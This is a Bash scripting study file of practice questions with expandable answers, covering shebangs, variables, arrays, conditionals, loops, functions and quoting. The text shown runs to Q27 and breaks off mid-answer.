# Bash Scripting Practice Questions — 100 Questions from Basics to Mastery

> Test yourself across the full Bash curriculum. Answers hidden until clicked.

---

## How to Use This File

1. **Read the question** — attempt your answer before opening the hint
2. **Use the framework** — run through the 5-step thinking process first
3. **Check your answer** — click "Show Answer" only after you've tried

---

## How to Think: 5-Step Framework

1. **Restate** — what is this question actually asking?
2. **Identify the concept** — which Bash feature/concept is being tested?
3. **Recall the rule** — what is the exact behaviour or rule?
4. **Apply to the case** — trace through the scenario step by step
5. **Sanity check** — does the result make sense? What edge cases exist?

---

## Progress Tracker

- [ ] **Tier 1 — Basics** (Q1–Q33): Fundamentals and core commands
- [ ] **Tier 2 — Intermediate** (Q34–Q66): Advanced features and real patterns
- [ ] **Tier 3 — Advanced** (Q67–Q75): Deep internals and edge cases
- [ ] **Tier 4 — Interview / Scenario** (Q76–Q90): Explain-it, compare-it, real-world problems
- [ ] **Tier 5 — Critical Thinking** (Q91–Q100): Predict output, debug, design decisions

---

## Question Type Legend

| Tag | Meaning |
|---|---|
| `[Normal]` | Recall + apply — straightforward concept check |
| `[Thinking]` | Requires reasoning about internals |
| `[Logical]` | Predict output or trace execution |
| `[Critical]` | Tricky gotcha or edge case |
| `[Interview]` | Explain or compare in interview style |
| `[Debug]` | Find and fix the broken code/config |
| `[Design]` | Architecture or approach decision |

---

## 🟢 Tier 1 — Basics

---

### Q1 · [Normal] · `shebang`

> **What is a shebang line? What is the difference between `#!/bin/bash` and `#!/usr/bin/env bash`? Which should you prefer and why?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A shebang (`#!`) is the first line of a script that tells the OS which interpreter to use. It must be the very first line, no preceding whitespace.

- `#!/bin/bash` — hardcodes the path to bash. Works if bash lives at `/bin/bash`, which is true on most Linux systems but not always on macOS or BSD.
- `#!/usr/bin/env bash` — asks `env` to find `bash` in the current `PATH`. More portable across systems and works correctly when bash is installed via Homebrew (`/opt/homebrew/bin/bash`).

**How to think through this:**
1. `/bin/bash` is an absolute path — it breaks silently if bash isn't there.
2. `env bash` delegates lookup to `PATH`, which is user-configurable and portable.
3. The tradeoff: `env` is slightly less secure in setuid scripts, but for normal scripts portability wins.

**Key takeaway:** Prefer `#!/usr/bin/env bash` for portability; use `#!/bin/bash` only when you know the exact path is guaranteed.

</details>

📖 **Theory:** [shebang](./01_shell_basics/shebang_and_execution.md#shebang-lines-and-script-execution)


---

### Q2 · [Normal] · `script-execution`

> **What are the three ways to execute a bash script? What permissions are needed for each method?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
1. `bash script.sh` — invoke bash directly and pass the file as an argument. Requires read permission (`r`). No execute bit needed.
2. `./script.sh` — run as an executable in the current directory. Requires read + execute permission (`chmod +x script.sh`). Uses the shebang to pick the interpreter.
3. `source script.sh` (or `. script.sh`) — runs the script in the **current shell process**, not a subshell. Requires read permission. Variables and functions defined inside persist after it exits.

**How to think through this:**
1. `bash script.sh` bypasses the shebang entirely — bash is explicitly chosen.
2. `./script.sh` creates a subshell; variable changes don't affect the parent.
3. `source` is used when you need the script to mutate the current shell (e.g., loading environment variables from a `.env` file).

**Key takeaway:** Use `source` when you need side effects in the current shell; use `./` or `bash` when you want isolation.

</details>

📖 **Theory:** [script-execution](./01_shell_basics/shebang_and_execution.md#shebang-lines-and-script-execution)


---

### Q3 · [Thinking] · `variables-basics`

> **What is the difference between `name="Alice"` and `name = "Alice"` in bash? What does `$name` vs `${name}` vs `"$name"` vs `'$name'` do?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `name="Alice"` — correct variable assignment. No spaces around `=`.
- `name = "Alice"` — **syntax error**. Bash sees `name` as a command with `=` and `"Alice"` as arguments.

For referencing:
- `$name` — expands the variable. Fine in simple cases but can break with adjacent characters (e.g., `$namefoo` looks for variable `namefoo`).
- `${name}` — explicit boundary around the variable name. Required when concatenating: `${name}foo`.
- `"$name"` — expands the variable but preserves it as a single word even if it contains spaces. **The correct default.**
- `'$name'` — single quotes suppress all expansion. Literally outputs `$name` as a string.

**How to think through this:**
1. Spaces around `=` have no meaning in assignment syntax — bash treats it as a command.
2. `${name}` vs `$name` is about delimiter clarity, not behavior.
3. Always double-quote variable expansions to prevent word splitting and glob expansion.

**Key takeaway:** Always write `"$name"` to safely expand variables; never put spaces around `=` in assignments.

</details>

📖 **Theory:** [variables-basics](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q4 · [Normal] · `variable-types`

> **What is the difference between a local variable, an environment variable, and a readonly variable? How do you create each?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- **Local variable** — exists only within the current shell or function scope. Created with just an assignment or `local` inside a function:
  ```bash
  my_var="hello"
  local my_var="hello"   # inside a function
  ```
- **Environment variable** — exported to child processes. Created with `export`:
  ```bash
  export MY_VAR="hello"
  # or
  MY_VAR="hello"; export MY_VAR
  ```
- **Readonly variable** — cannot be changed or unset after declaration. Created with `readonly` or `declare -r`:
  ```bash
  readonly PI=3.14
  declare -r PI=3.14
  ```

**How to think through this:**
1. A regular variable stays in the current shell — subshells and child commands don't inherit it.
2. `export` marks the variable for inheritance by any child process.
3. `readonly` adds a write-protect flag; attempting to reassign causes an error.

**Key takeaway:** Export variables that subprocesses need; use `readonly` for constants that should never change.

</details>

📖 **Theory:** [variable-types](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q5 · [Normal] · `string-operations`

> **How do you get the length of a string, extract a substring, and replace a substring in bash? Show the syntax for each.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
str="Hello, World"

# Length
echo ${#str}           # 12

# Substring: ${var:offset:length}
echo ${str:7:5}        # World

# Replace first match: ${var/pattern/replacement}
echo ${str/World/Bash} # Hello, Bash

# Replace all matches: ${var//pattern/replacement}
str2="aabbcc"
echo ${str2//b/X}      # aaXXcc
```

**How to think through this:**
1. `${#var}` counts the number of characters — the `#` prefix means "length of."
2. `${var:offset:length}` uses zero-based indexing, same as Python slicing but positional.
3. `${var/old/new}` replaces the first match; `${var//old/new}` replaces all matches (double slash = global).

**Key takeaway:** Bash has built-in parameter expansion for common string operations — no need for `sed` or `awk` for simple cases.

</details>

📖 **Theory:** [string-operations](./02_variables_and_data/string_operations.md#string-operations-in-bash)


---

### Q6 · [Thinking] · `arithmetic`

> **What are three ways to do arithmetic in bash: `$(( ))`, `let`, and `expr`? Which is preferred and why?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# Method 1: $(( )) — arithmetic expansion (preferred)
result=$(( 3 + 4 * 2 ))
echo $result   # 11

# Method 2: let
let result=3+4*2
echo $result   # 11

# Method 3: expr (legacy, external command)
result=$(expr 3 + 4)
echo $result   # 7
```

`$(( ))` is preferred because:
- It is a shell built-in — no subprocess spawned.
- Supports standard math operators: `+`, `-`, `*`, `/`, `%`, `**`.
- Variables inside don't need `$`: `$(( a + b ))` works without `$a`.
- Can be used inline: `echo $(( x * 2 ))`.

`expr` is a separate process, slower, and requires escaping `*`. `let` is fine but `$(( ))` is more readable and composable.

**How to think through this:**
1. `expr` was the old POSIX way — predates shell arithmetic.
2. `let` works but exits with code 1 when the result is 0, which can break `set -e` scripts.
3. `$(( ))` is clean, fast, and consistent.

**Key takeaway:** Use `$(( ))` for all arithmetic in bash — it is built-in, readable, and safe with `set -e`.

</details>

📖 **Theory:** [arithmetic](./02_variables_and_data/variables.md#arithmetic-with-variables)


---

### Q7 · [Normal] · `arrays-basics`

> **How do you declare an array, add elements, access an element, get all elements, and get the array length in bash?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# Declare and initialize
fruits=("apple" "banana" "cherry")

# Add an element
fruits+=("date")

# Access by index (zero-based)
echo ${fruits[0]}       # apple
echo ${fruits[2]}       # cherry

# All elements
echo ${fruits[@]}       # apple banana cherry date

# Array length
echo ${#fruits[@]}      # 4

# Iterate
for f in "${fruits[@]}"; do
  echo "$f"
done
```

**How to think through this:**
1. Always use `${fruits[@]}` (not `$fruits`) — bare `$fruits` only gives the first element.
2. Quote `"${fruits[@]}"` when iterating so elements with spaces are handled correctly.
3. `${#fruits[@]}` follows the same `#` = length pattern as string length.

**Key takeaway:** Always reference arrays with `[@]` and double-quote the expansion to handle elements with spaces safely.

</details>

📖 **Theory:** [arrays-basics](./02_variables_and_data/arrays.md#arrays-in-bash)


---

### Q8 · [Normal] · `associative-arrays`

> **What is an associative array? How do you declare one and iterate over its key-value pairs?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
An associative array is a key-value map (like a dictionary in Python). Keys are arbitrary strings, not integers.

```bash
# Must explicitly declare with -A
declare -A colors

colors["apple"]="red"
colors["banana"]="yellow"
colors["grape"]="purple"

# Access by key
echo ${colors["apple"]}    # red

# All keys
echo ${!colors[@]}

# All values
echo ${colors[@]}

# Iterate over key-value pairs
for key in "${!colors[@]}"; do
  echo "$key => ${colors[$key]}"
done
```

**How to think through this:**
1. `declare -A` is required — without it, bash treats it as an indexed array and silently drops string keys.
2. `${!array[@]}` gives keys; `${array[@]}` gives values.
3. Iteration order is not guaranteed (hash map semantics).

**Key takeaway:** Always use `declare -A` for associative arrays and `${!array[@]}` to iterate keys.

</details>

📖 **Theory:** [associative-arrays](./02_variables_and_data/arrays.md#associative-arrays-dictionaries)


---

### Q9 · [Thinking] · `if-conditions`

> **What is the difference between `[ ]`, `[[ ]]`, and `(( ))` for conditions in bash? When would you use each?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `[ ]` — POSIX `test` command. Works in any POSIX shell (`sh`, `dash`, `bash`). Requires quoting variables carefully. No regex, no `&&`/`||` inside.
- `[[ ]]` — bash built-in extended test. Smarter: no word splitting on unquoted variables, supports `&&`, `||`, `=~` for regex, pattern matching with `==`. **Preferred in bash scripts.**
- `(( ))` — arithmetic evaluation. Returns 0 (true) if result is non-zero, 1 (false) if result is zero. Used for integer comparisons.

```bash
# [ ] — POSIX, portable
[ "$name" = "Alice" ]

# [[ ]] — bash, safer and more capable
[[ $name == "Alice" ]]
[[ $name =~ ^A.*e$ ]]

# (( )) — arithmetic
(( x > 5 ))
(( x++ ))
```

**How to think through this:**
1. `[ ]` can break with empty variables or spaces if not quoted — `[[ ]]` is forgiving.
2. `[[ ]]` is not portable to `/bin/sh` — only use in scripts with `#!/bin/bash`.
3. `(( ))` is purely for numbers; never use it with strings.

**Key takeaway:** Use `[[ ]]` for string/file tests and `(( ))` for arithmetic in bash scripts.

</details>

📖 **Theory:** [if-conditions](./03_control_flow/conditionals.md#basic-if-statement)


---

### Q10 · [Normal] · `test-operators`

> **What do `-z`, `-n`, `-f`, `-d`, `-e`, `-r`, `-w`, `-x` test for? Give one example of each.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

| Flag | Tests for | Example |
|------|-----------|---------|
| `-z` | String is empty (zero length) | `[[ -z "$var" ]] && echo "empty"` |
| `-n` | String is non-empty (non-zero length) | `[[ -n "$var" ]] && echo "set"` |
| `-f` | Path exists and is a regular file | `[[ -f "/etc/hosts" ]] && echo "file exists"` |
| `-d` | Path exists and is a directory | `[[ -d "/tmp" ]] && echo "is a dir"` |
| `-e` | Path exists (file, dir, symlink, etc.) | `[[ -e "/tmp/log" ]] && echo "exists"` |
| `-r` | File exists and is readable | `[[ -r "data.csv" ]] && cat data.csv` |
| `-w` | File exists and is writable | `[[ -w "output.txt" ]] && echo "can write"` |
| `-x` | File exists and is executable | `[[ -x "./script.sh" ]] && ./script.sh` |

**How to think through this:**
1. `-z` and `-n` are string tests; the rest are file tests.
2. `-e` is the broadest existence check; `-f` and `-d` are specific type checks.
3. `-r`, `-w`, `-x` check effective permissions for the current user.

**Key takeaway:** Use `-f` when you specifically need a regular file, `-e` when any filesystem object counts, and `-z`/`-n` to guard against unset variables.

</details>

📖 **Theory:** [test-operators](./03_control_flow/conditionals.md#file-test-operators)


---

### Q11 · [Thinking] · `string-comparison`

> **What is the difference between `=` and `==` in bash string comparisons? What about `=~` in `[[ ]]`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- Inside `[ ]`: only `=` is POSIX-standard for equality. `==` works in bash's `[ ]` but is not portable.
- Inside `[[ ]]`: both `=` and `==` are identical and mean string equality. `==` is more common in `[[ ]]` by convention.
- `=~` inside `[[ ]]` performs **extended regex matching** (ERE). The right-hand side is a regex pattern, not a glob. Do not quote the pattern.

```bash
name="Alice123"

[[ "$name" == "Alice123" ]]   # exact match — true
[[ "$name" = A* ]]            # glob pattern match — true
[[ "$name" =~ ^Alice[0-9]+$ ]] # regex match — true

# Capture groups go into BASH_REMATCH
[[ "$name" =~ ^(Alice)([0-9]+)$ ]]
echo ${BASH_REMATCH[1]}   # Alice
echo ${BASH_REMATCH[2]}   # 123
```

**How to think through this:**
1. `=` inside `[ ]` is the portable POSIX choice.
2. `==` inside `[[ ]]` is idiomatic bash.
3. `=~` unlocks full regex power and populates `BASH_REMATCH` for capture groups.

**Key takeaway:** Use `==` inside `[[ ]]` for equality, and `=~` when you need regex matching with optional capture groups via `BASH_REMATCH`.

</details>

📖 **Theory:** [string-comparison](./03_control_flow/conditionals.md#string-comparison-operators)


---

### Q12 · [Normal] · `for-loop`

> **Show three forms of bash `for` loops: C-style, iterate over array, iterate over command output. When would you use each?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# 1. C-style — use when you need an index or counter
for (( i=0; i<5; i++ )); do
  echo "Step $i"
done

# 2. Iterate over array — use when processing a list of items
files=("a.txt" "b.txt" "c.txt")
for f in "${files[@]}"; do
  echo "Processing $f"
done

# 3. Iterate over command output — use when list comes from a command
for user in $(cut -d: -f1 /etc/passwd); do
  echo "User: $user"
done
```

When to use each:
- C-style: numeric counters, index tracking, repeat N times.
- Array iteration: processing known lists; safest for filenames with spaces.
- Command output: quick one-liners when items are single words (no spaces). For multi-word items or large files, prefer `while read` instead.

**How to think through this:**
1. Command substitution in `for` splits on any whitespace — filenames with spaces will break.
2. Array iteration with `"${arr[@]}"` is the safest pattern for arbitrary data.
3. C-style is useful when you need the index alongside the value.

**Key takeaway:** Prefer array iteration for safety; use `while read` over `for $(cat file)` when input may contain spaces.

</details>

📖 **Theory:** [for-loop](./03_control_flow/loops.md#the-for-loop)


---

### Q13 · [Thinking] · `while-loop`

> **Write a `while read line` loop that processes each line of a file. Why is this better than `for line in $(cat file)`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# while read — correct approach
while IFS= read -r line; do
  echo "Line: $line"
done < file.txt
```

Why `while read` is better than `for line in $(cat file)`:

1. **Word splitting**: `$(cat file)` splits on any whitespace (spaces, tabs, newlines). A line like `hello world` becomes two iterations: `hello` and `world`.
2. **Glob expansion**: `$(cat file)` expands globs. A line containing `*` would expand to filenames.
3. **Memory**: `$(cat file)` loads the entire file into memory. `while read` streams line by line.
4. **`IFS=`** prevents leading/trailing whitespace from being stripped.
5. **`-r`** prevents backslash interpretation.

```bash
# Dangerous — splits on spaces, expands globs
for line in $(cat file.txt); do
  echo "$line"
done
```

**How to think through this:**
1. `$(cat file)` is a command substitution that produces one big string — the shell then re-splits it.
2. `while read` processes the raw byte stream line by line without re-interpretation.
3. `IFS= read -r` is the canonical safe form.

**Key takeaway:** Always use `while IFS= read -r line; do ... done < file` to iterate file lines correctly.

</details>

📖 **Theory:** [while-loop](./03_control_flow/loops.md#the-while-loop)


---

### Q14 · [Logical] · `until-loop`

> **What is the difference between `while` and `until`? Write an `until` loop that polls a service until it responds.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `while condition` — loops **as long as** the condition is **true** (exit code 0).
- `until condition` — loops **as long as** the condition is **false** (exit code non-zero). It is the logical inverse of `while`.

```bash
# Poll until a web service responds on port 8080
until curl -s http://localhost:8080/health > /dev/null 2>&1; do
  echo "Waiting for service..."
  sleep 2
done
echo "Service is up!"
```

Equivalent `while` version for comparison:
```bash
while ! curl -s http://localhost:8080/health > /dev/null 2>&1; do
  sleep 2
done
```

**How to think through this:**
1. `until` reads more naturally for "wait until ready" patterns — no `!` negation needed.
2. Both are semantically equivalent; `until` is just syntactic sugar for `while !`.
3. Always add a `sleep` inside polling loops to avoid hammering the service.

**Key takeaway:** Use `until` when the natural phrasing is "keep going until this becomes true" — it reads more like plain English than `while !`.

</details>

📖 **Theory:** [until-loop](./03_control_flow/loops.md#loop-until-command-succeeds-retry-pattern)


---

### Q15 · [Normal] · `loop-control`

> **What do `break`, `continue`, and `break 2` do inside nested loops?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `break` — exits the innermost loop immediately.
- `continue` — skips the rest of the current iteration and moves to the next one in the innermost loop.
- `break N` — exits N levels of nested loops. `break 2` breaks out of both the inner and outer loop.

```bash
for i in 1 2 3; do
  for j in a b c; do
    if [[ $j == "b" ]]; then
      break      # exits inner loop only — i continues
    fi
    echo "$i-$j"
  done
done
# Output: 1-a  2-a  3-a

for i in 1 2 3; do
  for j in a b c; do
    if [[ $i == 2 && $j == "b" ]]; then
      break 2    # exits both loops entirely
    fi
    echo "$i-$j"
  done
done
# Output: 1-a  1-b  1-c  2-a
```

**How to think through this:**
1. `break` and `continue` without a number always act on the innermost loop.
2. `break 2` is a bash feature — not POSIX, but widely supported.
3. `continue 2` also exists: skips to the next iteration of the outer loop.

**Key takeaway:** Use `break 2` to escape nested loops cleanly without flag variables or goto-style hacks.

</details>

📖 **Theory:** [loop-control](./03_control_flow/loops.md#loops-in-bash)


---

### Q16 · [Design] · `case-statement`

> **Write a `case` statement that handles `start`, `stop`, `restart`, and `status` commands (like a service script).**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
#!/usr/bin/env bash

ACTION="${1:-}"

case "$ACTION" in
  start)
    echo "Starting service..."
    # start logic here
    ;;
  stop)
    echo "Stopping service..."
    # stop logic here
    ;;
  restart)
    echo "Restarting service..."
    # could call stop then start
    ;;
  status)
    echo "Checking status..."
    # status logic here
    ;;
  "")
    echo "Error: no action provided." >&2
    echo "Usage: $0 {start|stop|restart|status}" >&2
    exit 1
    ;;
  *)
    echo "Unknown action: $ACTION" >&2
    echo "Usage: $0 {start|stop|restart|status}" >&2
    exit 1
    ;;
esac
```

**How to think through this:**
1. Each pattern ends with `;;` — this is the break equivalent for `case`.
2. `*)` is the catch-all default, like `else` in an if chain.
3. `""` handles the no-argument case explicitly before `*` swallows it.
4. Multiple patterns can share one block: `start|begin)`.

**Key takeaway:** `case` is cleaner than chained `if/elif` for matching a single variable against multiple fixed values.

</details>

📖 **Theory:** [case-statement](./03_control_flow/case_statements.md#case-statements-in-bash)


---

### Q17 · [Normal] · `functions-basics`

> **How do you define and call a function in bash? How do you pass arguments to it?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# Definition — two equivalent syntaxes
greet() {
  echo "Hello, $1!"
}

function greet {
  echo "Hello, $1!"
}

# Call — just use the name, pass args like a command
greet "Alice"     # Hello, Alice!
greet "Bob"       # Hello, Bob!

# Multiple arguments
add() {
  local a=$1
  local b=$2
  echo $(( a + b ))
}

result=$(add 3 5)
echo $result      # 8
```

Arguments inside a function are accessed via `$1`, `$2`, ... `$@` — just like script-level positional parameters. They are scoped to the function call and don't affect the outer `$1`, `$2`.

**How to think through this:**
1. `function name { }` is bash-specific syntax; `name() { }` is POSIX-compatible.
2. Arguments are passed positionally, not by name — no keyword arguments in bash.
3. Use `local` to prevent variables from leaking out of the function.

**Key takeaway:** Define functions with `name() { }` and pass data via positional arguments; capture output with `$(function_name args)`.

</details>

📖 **Theory:** [functions-basics](./04_functions/functions.md#functions-in-bash)


---

### Q18 · [Thinking] · `function-return`

> **What is the difference between `return` and `echo` for returning values from bash functions? What values can `return` accept?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `return N` — sets the function's **exit code** (0–255). It does not return a string or number to the caller. 0 = success, non-zero = failure. Checked via `$?`.
- `echo` (or `printf`) — the conventional way to return a **string or computed value**. The caller captures it with command substitution `$(...)`.

```bash
# return — for success/failure signaling
is_even() {
  (( $1 % 2 == 0 ))   # sets exit code: 0 if true, 1 if false
}
if is_even 4; then echo "even"; fi

# echo — for returning data
get_upper() {
  echo "${1^^}"    # bash uppercase expansion
}
result=$(get_upper "hello")
echo $result       # HELLO
```

`return` only accepts integers 0–255. Values above 255 wrap around. You cannot `return "a string"`.

**How to think through this:**
1. Think of `return` like HTTP status codes — it communicates pass/fail, not payload.
2. Think of `echo` like a function's return value in Python — it produces the actual data.
3. Mixing both is common: `echo` the result and `return 1` on error.

**Key takeaway:** Use `return` for exit status (success/failure) and `echo`/`printf` to pass actual data back to the caller.

</details>

📖 **Theory:** [function-return](./04_functions/scope_and_return.md#scope-and-return-values-in-bash)


---

### Q19 · [Debug] · `local-variables`

> **What happens if you don't use `local` inside a function? Predict the output:**

```bash
x=10
foo() { x=20; }
foo
echo $x
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Output: `20`

Without `local`, assigning `x=20` inside `foo` modifies the **global** variable `x`. The function and the outer script share the same variable namespace.

**How to think through this:**
1. Bash does not create a new scope for variables unless you explicitly use `local`.
2. `foo` runs, assigns `x=20` globally, and returns.
3. `echo $x` prints `20` — the outer `x=10` has been overwritten.

To prevent this:
```bash
x=10
foo() {
  local x=20    # creates a new x scoped to foo
  echo "inside: $x"
}
foo
echo "outside: $x"
# inside: 20
# outside: 10
```

**Key takeaway:** Always declare function-internal variables with `local` to avoid accidentally clobbering global state.

</details>

📖 **Theory:** [local-variables](./04_functions/scope_and_return.md#why-local-matters-in-real-scripts)


---

### Q20 · [Normal] · `positional-params`

> **What are `$0`, `$1`, `$@`, `$*`, `$#`, `$$`, `$?`? How do `$@` and `$*` differ when quoted?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

| Variable | Meaning |
|----------|---------|
| `$0` | Name of the script or shell |
| `$1`, `$2`... | Positional arguments |
| `$@` | All positional arguments as separate words |
| `$*` | All positional arguments as a single string |
| `$#` | Number of positional arguments |
| `$$` | PID of the current shell process |
| `$?` | Exit code of the last command |

**The key difference — `"$@"` vs `"$*"`:**
```bash
# Given: script.sh "hello world" "foo"

# "$@" — preserves each argument as a separate quoted word
for arg in "$@"; do echo "$arg"; done
# hello world
# foo

# "$*" — joins all args into one string using IFS (default: space)
for arg in "$*"; do echo "$arg"; done
# hello world foo
```

**How to think through this:**
1. `"$@"` expands to `"hello world" "foo"` — two words.
2. `"$*"` expands to `"hello world foo"` — one word.
3. Always use `"$@"` when forwarding arguments to another command.

**Key takeaway:** Use `"$@"` to safely pass all arguments along — it preserves argument boundaries including spaces.

</details>

📖 **Theory:** [positional-params](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q21 · [Normal] · `special-vars`

> **What does `$?` return? Write a script that checks whether a command succeeded and prints a helpful message.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`$?` holds the **exit code of the last executed command**. 0 means success; any non-zero value means failure.

```bash
#!/usr/bin/env bash

ping -c 1 google.com > /dev/null 2>&1

if [[ $? -eq 0 ]]; then
  echo "Network is reachable."
else
  echo "Network check failed (exit code: $?)."
fi
```

More idiomatic approach — test the command directly:
```bash
if ping -c 1 google.com > /dev/null 2>&1; then
  echo "Network is reachable."
else
  echo "Network check failed."
fi
```

**How to think through this:**
1. `$?` is set after every command, pipeline, or function call.
2. Checking `$?` explicitly is fragile — by the time you check it, another command may have overwritten it.
3. Using the command directly in an `if` condition is cleaner and less error-prone.

**Key takeaway:** Prefer `if command; then` over `command; if [[ $? -eq 0 ]]` — it's safer and idiomatic.

</details>

📖 **Theory:** [special-vars](./02_variables_and_data/variables.md#special-variables)


---

### Q22 · [Normal] · `read-input`

> **How does `read -p "Enter name: " name` work? What do `-s` and `-t 5` flags add?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`read` reads a line from stdin and assigns it to a variable.

```bash
# Basic prompt
read -p "Enter name: " name
echo "Hello, $name"

# Silent input (for passwords — input not echoed)
read -sp "Enter password: " password
echo    # newline after hidden input
echo "Password stored (${#password} chars)"

# Timeout — fails if no input within 5 seconds
if read -t 5 -p "Enter value (5s timeout): " val; then
  echo "Got: $val"
else
  echo "Timed out."
fi
```

- `-p "prompt"` — display a prompt string without a newline before reading.
- `-s` — silent mode: input is not echoed to the terminal. Used for passwords.
- `-t N` — timeout after N seconds. `read` returns exit code 1 on timeout.

**How to think through this:**
1. `-p` and `-s` can be combined: `read -sp "Password: " pass`.
2. Always `echo` a newline after `-s` input — the user's Enter is suppressed.
3. `-t` is useful in scripts that shouldn't hang waiting for input.

**Key takeaway:** Combine `-sp` for password prompts and always check `read`'s exit code when using `-t` for timeouts.

</details>

📖 **Theory:** [read-input](./05_input_output/user_input.md#simple-read--waits-for-input-stores-in-variable)


---

### Q23 · [Critical] · `pipes-in-scripts`

> **What is the difference between `cat file | while read line` and `while read line < file`? Which preserves the outer scope?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
# Method 1: pipe — runs while loop in a SUBSHELL
count=0
cat file.txt | while IFS= read -r line; do
  (( count++ ))
done
echo $count    # 0 — count change was lost! Subshell exited.

# Method 2: redirect — runs while loop in the CURRENT shell
count=0
while IFS= read -r line; do
  (( count++ ))
done < file.txt
echo $count    # correct count — scope preserved
```

The pipe (`|`) creates a subshell for each command in the pipeline. Variable mutations inside the subshell do not propagate back. The redirect (`< file`) feeds the file into `while` without forking a new shell.

**How to think through this:**
1. In bash (before 4.2 with `lastpipe`), every stage of a pipeline runs in a subshell.
2. Any variable changes, function calls, or `cd` inside a piped `while` are invisible after the loop.
3. `< file` is just stdin redirection — no subshell is created.

**Key takeaway:** Always use `while read; done < file` to preserve variable changes — the pipe form silently discards them.

</details>

📖 **Theory:** [pipes-in-scripts](./05_input_output/pipes_and_redirection.md#pipes-and-redirection)


---

### Q24 · [Normal] · `command-substitution`

> **What is the difference between `$(command)` and `` `command` ``? Which is preferred and why?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Both capture the stdout of a command and substitute it inline. They are functionally equivalent in simple cases.

```bash
# Backtick style (legacy)
today=`date +%Y-%m-%d`

# $() style (modern, preferred)
today=$(date +%Y-%m-%d)
```

`$()` is preferred because:
1. **Nesting** — `$(outer $(inner))` is readable. Backticks require escaping: `` `outer \`inner\`` `` — hard to read.
2. **Readability** — `$()` has clear open/close delimiters.
3. **Quoting** — backticks have subtle quoting edge cases inside strings.
4. **POSIX** — both are POSIX, but `$()` is the modern standard.

```bash
# Nested — clean with $()
result=$(echo $(date +%Y))

# Nested — painful with backticks
result=`echo \`date +%Y\``
```

**How to think through this:**
1. Backticks work, but they're a relic of original Bourne shell.
2. Every modern style guide, shellcheck, and linter recommends `$()`.
3. The only reason to use backticks is compatibility with ancient `/bin/sh`.

**Key takeaway:** Always use `$()` — it nests cleanly, reads clearly, and is the modern standard.

</details>

📖 **Theory:** [command-substitution](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q25 · [Thinking] · `brace-expansion`

> **What does `echo {a,b,c}.txt` produce? What about `echo {1..5}` and `cp file.txt{,.bak}`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
```bash
echo {a,b,c}.txt
# a.txt b.txt c.txt

echo {1..5}
# 1 2 3 4 5

echo {1..10..2}
# 1 3 5 7 9   (step by 2)

cp file.txt{,.bak}
# expands to: cp file.txt file.txt.bak
# The empty string before the comma gives "file.txt" + "" = "file.txt"

mkdir -p project/{src,tests,docs}
# creates: project/src  project/tests  project/docs
```

**How to think through this:**
1. Brace expansion happens **before** filename globbing — it works even if the files don't exist.
2. `{a,b,c}` is a comma list; `{1..5}` is a sequence; `{1..10..2}` adds a step.
3. `file.txt{,.bak}` is the idiom for "make a backup copy" — the empty first element preserves the original name.

**Key takeaway:** Brace expansion is purely textual — use it to generate argument lists, create directory trees, and make backup copies concisely.

</details>

📖 **Theory:** [brace-expansion](./02_variables_and_data/string_operations.md#string-operations-in-bash)


---

### Q26 · [Normal] · `glob-patterns`

> **What is the difference between `*`, `?`, `[abc]`, `[0-9]`, and `**` (with globstar) in bash?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

| Pattern | Matches |
|---------|---------|
| `*` | Any string of characters (not including `/`) |
| `?` | Any single character |
| `[abc]` | Any one character from the set: a, b, or c |
| `[0-9]` | Any one digit character |
| `**` | Any path including subdirectories (requires `shopt -s globstar`) |

```bash
ls *.txt           # all .txt files in current dir
ls report?.txt     # report1.txt, reportA.txt, etc.
ls file[123].txt   # file1.txt, file2.txt, file3.txt
ls data[0-9].csv   # data0.csv through data9.csv

shopt -s globstar
ls **/*.py         # all .py files recursively in all subdirs
```

**How to think through this:**
1. `*` does not cross directory boundaries — it only matches within the current level.
2. `**` requires `shopt -s globstar` to be enabled first; without it, `**` behaves like `*`.
3. Globs expand at the shell level before the command runs — the command never sees the pattern.

**Key takeaway:** Enable `shopt -s globstar` at the top of scripts when you need recursive matching; use `[0-9]` and `[abc]` for precise single-character filtering.

</details>

📖 **Theory:** [glob-patterns](./01_shell_basics/first_script.md#your-first-shell-script)


---

### Q27 · [Debug] · `quoting-rules`

> **Explain single quotes, double quotes, and backslash escaping in bash. Predict the output of:**

```bash
name="World"
echo 'Hello $name'
echo "Hello $name"
echo Hello\ World
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Output:
```
Hello $name
Hello World
Hello World
```

Explanation:
- `'Hello $name'` — single quotes suppress **all** special character interpretation. `$name` is literal text.
- `"Hello $name"` — double quotes allow variable expansion and command substitution, but suppress word splitting and glob expansion. `$name` becomes `World`.
- `Hello\ World` — the backslash escapes the space, making it a literal space character rather than a word separator. The shell sees one argument: `Hello World`.

**How to think through this:**
1. Single quotes: nothing is interpreted — the safest literal string.
2. Double quotes: `$`, `` ` ``, `\`, and `!` (in interactive shell) are still interpreted.
3. Backslash: escapes the next character only, one at a time.

